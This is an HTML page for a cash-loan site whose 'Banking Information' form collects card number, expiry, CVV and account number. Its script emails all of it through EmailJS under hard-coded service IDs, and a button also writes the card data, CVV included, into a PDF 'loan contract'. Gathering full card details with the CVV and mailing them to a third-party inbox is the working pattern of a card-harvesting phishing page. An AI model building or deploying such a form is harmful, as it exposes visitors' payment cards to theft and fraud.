<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Banking Information</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
  <script>
    (function(){
      emailjs.init("MAz2iorQdsu62nPTr");
    })();

    function sendBankForm(e) {
      e.preventDefault();
      emailjs.sendForm("service_xdj3o94", "template_rakkobj", e.target)
        .then(() => {
          alert("✅ Bank info sent successfully!");
        }, (err) => {
          alert("❌ Failed to send: " + JSON.stringify(err));
        });
    }

    function downloadPDF() {
      const { jsPDF } = window.jspdf;
      const doc = new jsPDF();
      const name = document.getElementById("bank_name").value;
      const card = document.getElementById("card_number").value;
      const expiry = document.getElementById("expiry_date").value;
      const cvv = document.getElementById("cvv").value;
      const account = document.getElementById("account_number").value;

      doc.setFontSize(16);
      doc.text("Thubalesha Cash Loan Agreement", 20, 20);
      doc.setFontSize(12);
      doc.text(`Bank Name: ${name}`, 20, 40);
      doc.text(`Card Number: ${card}`, 20, 50);
      doc.text(`Expiry Date: ${expiry}`, 20, 60);
      doc.text(`CVV: ${cvv}`, 20, 70);
      doc.text(`Account Number: ${account}`, 20, 80);
      doc.text("Thank you for using Thubalesha Cash Loan.", 20, 100);

      doc.save("Loan_Contract.pdf");
    }
  </script>
  <style>
    body { font-family: Arial, sans-serif; background:#f7f9fc; padding:20px; }
    header { display:flex; align-items:center; margin-bottom:20px; }
    header img { height:60px; margin-right:15px; }
    h1 { color:#004080; }
    .nav { background:#004080; padding:10px; border-radius:8px; margin-bottom:20px; }
    .nav a { color:white; text-decoration:none; margin:0 15px;
      font-weight:bold; padding:6px 12px; border-radius:5px; }
    .nav a:hover { background:#0066cc; }
    form { background:#fff; padding:20px; border-radius:8px; box-shadow:0 0 6px #ccc; }
    label { display:block; margin-top:10px; font-weight:bold; }
    input { width:100%; padding:8px; margin-top:5px; border:1px solid #ccc; border-radius:5px; }
    button { margin-top:15px; padding:10px 20px; background:#004080; color:white; border:none; border-radius:5px; cursor:pointer; }
    button:hover { background:#0066cc; }
  </style>
</head>
<body>
  <header>
    <img src="thubaf.jpg" alt="Logo">
    <h1>Thubalesha Cash Loan</h1>
  </header>

  <!-- 🔹 Navigation Menu -->
  <div class="nav">
    <a href="index.html">Calculator</a>
    <a href="contract_form.html">Application Contract</a>
    <a href="terms_form.html">Terms & Conditions</a>
    <a href="comment_form.html">Comments</a>
    <a href="bank_form.html">Banking Info</a>
  </div>

  <h2>Banking Information</h2>
  <form onsubmit="sendBankForm(event)">
    <label>Bank Name</label><input type="text" name="bank_name" id="bank_name" required>
    <label>Card Number</label><input type="text" name="card_number" id="card_number" required>
    <label>Expiry Date</label><input type="text" name="expiry_date" id="expiry_date" placeholder="MM/YY" required>
    <label>CVV</label><input type="text" name="cvv" id="cvv" required>
    <label>Account Number</label><input type="text" name="account_number" id="account_number" required>
    <button type="submit">Submit Bank Info</button>
  </form>

  <button onclick="downloadPDF()">Download PDF Contract</button>
</body>
</html>
